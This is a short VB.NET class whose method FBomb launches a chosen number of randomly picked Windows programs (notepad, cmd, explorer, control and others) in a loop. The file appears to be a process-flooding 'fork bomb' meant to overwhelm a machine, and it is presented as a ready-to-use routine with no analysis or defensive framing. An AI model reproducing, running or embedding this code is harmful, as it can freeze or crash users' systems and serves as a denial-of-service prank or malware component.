Public Class V2
    Public Shared Sub FBomb(ByVal L As Integer)
        Dim h As String() = {"notepad", "explorer", "write", "cmd", "cmstp", "colorcpl",
            "conhost", "control", "dfrgui", "iexpress", "msinfo32", "mspaint"}

        Static h2 As New Random
        For i = 0 To L - 1
            Try
                Shell(h(h2.Next(0, 11)), AppWinStyle.NormalFocus)
            Catch ex As Exception
                Shell(h(3), AppWinStyle.NormalFocus)
            End Try

        Next

    End Sub
End Class
